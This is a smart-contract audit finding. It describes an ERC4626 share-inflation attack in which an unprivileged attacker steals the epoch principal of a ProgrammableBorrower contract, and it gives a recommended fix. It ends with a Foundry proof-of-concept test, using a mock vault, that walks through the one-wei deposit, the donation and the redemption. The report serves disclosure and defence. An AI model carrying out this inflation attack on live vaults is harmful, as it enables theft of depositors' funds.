### Title
ERC4626 share inflation lets an attacker steal programmable-borrower epoch principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits all epoch cash into an externally configured ERC4626 vault without checking the shares returned or the post-deposit value of those shares. An unprivileged vault user can execute a first-depositor inflation attack before `onStartEpoch`, cause the borrower contract to receive zero or economically worthless shares, and redeem the pool’s principal.

### Finding Description
`setVault` only verifies that the ERC4626 vault uses the same underlying asset; it does not require an existing share supply, minimum liquidity, or a trusted vault implementation. [1](#0-0) 

At epoch start, `IdleCDOEpochVariant` transfers surplus pool assets to the configured borrower and then invokes the programmable-borrower start hook. [2](#0-1)  `onStartEpoch` records all contract cash plus vault assets as the epoch baseline and deposits the entire cash balance into the vault. [3](#0-2) 

The vulnerable operation is `_depositToVault`: it accepts the vault’s returned share count without requiring `shares > 0`, comparing shares with `previewDeposit`, or checking that the resulting position remains worth approximately the deposited assets. [4](#0-3) 

For a vault initially empty, the attacker can deposit one wei to obtain one share and donate `D` underlying directly to the vault. When `D + 1 > A`, the borrower’s subsequent deposit of `A` mints `floor(A * 1 / (D + 1)) = 0` shares, while the attacker remains the sole shareholder and can redeem the donated assets plus the pool’s `A`. [5](#0-4) 

The accounting then records a vault loss because `epochStartVaultAssets` still includes `A`, while `_currentVaultAssets()` returns zero for the borrower’s empty share position. [6](#0-5)  During a close or withdrawal recall, `onStopEpoch` cannot withdraw assets that are no longer represented by borrower-owned shares; the later CDO pull fails and enters the borrower-default path. [7](#0-6) [8](#0-7) 

### Impact Explanation
This causes direct theft and pool insolvency up to the full amount deposited by `ProgrammableBorrower` during `onStartEpoch`. With `A = 100,000` underlying and attacker-donated `D = 1,000,000`, the borrower receives zero vault shares and the attacker redeems `1,000,001 + 100,000` for a net gain of `100,001` less one wei if their initial share deposit is included in the accounting baseline.

The loss is not a market or oracle assumption: it is created by the contract accepting an ERC4626 deposit result whose share value can be reduced to zero by an unprivileged vault depositor. The stolen principal remains represented as CDO strategy-token liabilities, but the programmable borrower no longer controls backing assets, so withdrawal recalls can default. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The attack requires a programmable-borrower deployment whose configured ERC4626 vault is empty or otherwise has a share price susceptible to donation-based manipulation before `onStartEpoch`. Such configuration is permitted because only the vault’s `asset()` is validated. [1](#0-0) 

The attacker does not need a privileged role, KYC status, tranche balance, or borrower access; any user of the external vault can make the initial deposit and donation before the honest manager starts the epoch. Likelihood is lower when the selected vault is already safely initialized with material, manipulation-resistant liquidity, but neither `setVault` nor `_depositToVault` enforces that precondition. [4](#0-3) 

### Recommendation
Require `_depositToVault` to receive a nonzero number of shares and to verify that `convertToAssets(shares)` is within an explicit tolerance of the deposited assets; preferably call `previewDeposit` before transfer and revert on a meaningful discrepancy.

Also reject vaults with zero supply or assets below a configured minimum, or initialize new vault positions through a trusted seeding procedure before lender funds are deposited. A minimum-share `mint` call can provide stronger protection than an asset-denominated `deposit`, because it fails rather than silently issuing a worthless position.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProgrammableBorrower} from
    "contracts/strategies/idle/ProgrammableBorrower.sol";

contract Asset is ERC20 {
    constructor() ERC20("Asset", "AST") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// Standard ERC4626-style conversion: first deposit mints 1:1,
/// later deposits divide by currently held assets, including donations.
contract InflatableVault is ERC20 {
    Asset public immutable asset;

    constructor(Asset asset_) ERC20("Vault", "vAST") {
        asset = asset_;
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        shares = supply == 0 ? assets : assets * supply / totalAssets();
        asset.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        asset.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerInflationPoC is Test {
    Asset internal asset;
    InflatableVault internal vault;
    ProgrammableBorrower internal programmableBorrower;

    address internal attacker = makeAddr("attacker");
    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal realBorrower = makeAddr("realBorrower");
    address internal proxyAdmin = makeAddr("proxyAdmin");

    /// This contract stands in for IdleCDOEpochVariant in the PB hook checks.
    function token() external view returns (address) {
        return address(asset);
    }

    function test_epochDepositCanBeStolenThroughShareInflation() external {
        asset = new Asset();
        vault = new InflatableVault(asset);

        ProgrammableBorrower implementation = new ProgrammableBorrower();
        programmableBorrower = ProgrammableBorrower(
            address(
                new TransparentUpgradeableProxy(
                    address(implementation),
                    proxyAdmin,
                    abi.encodeCall(
                        ProgrammableBorrower.initialize,
                        (
                            address(vault),
                            address(this), // idleCDO hook caller
                            owner,
                            manager,
                            realBorrower,
                            0
                        )
                    )
                )
            )
        );

        uint256 attackerDonation = 1_000_000e18;
        uint256 epochPrincipal = 100_000e18;

        // Attacker creates the first share and inflates assets per share.
        asset.mint(attacker, attackerDonation + 1);
        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), attackerDonation);
        vm.stopPrank();

        // IdleCDO sends epoch cash to ProgrammableBorrower, then starts accounting.
        asset.mint(address(programmableBorrower), epochPrincipal);
        programmableBorrower.onStartEpoch(0);

        // floor(100_000e18 * 1 / 1_000_001e18) == 0.
        assertEq(vault.balanceOf(address(programmableBorrower)), 0);
        assertEq(programmableBorrower.totalUnderlying(), 0);
        assertEq(programmableBorrower.epochStartVaultAssets(), epochPrincipal);

        // Sole shareholder redeems its cost basis plus the pool's epoch principal.
        vm.prank(attacker);
        uint256 redeemed = vault.redeem(1, attacker, attacker);

        assertEq(redeemed, attackerDonation + 1 + epochPrincipal);
        assertEq(asset.balanceOf(attacker), redeemed);

        // A close/recall cannot source the requested principal from PB.
        assertTrue(programmableBorrower.onStopEpoch(epochPrincipal, true));
        assertEq(asset.balanceOf(address(programmableBorrower)), 0);
    }
}
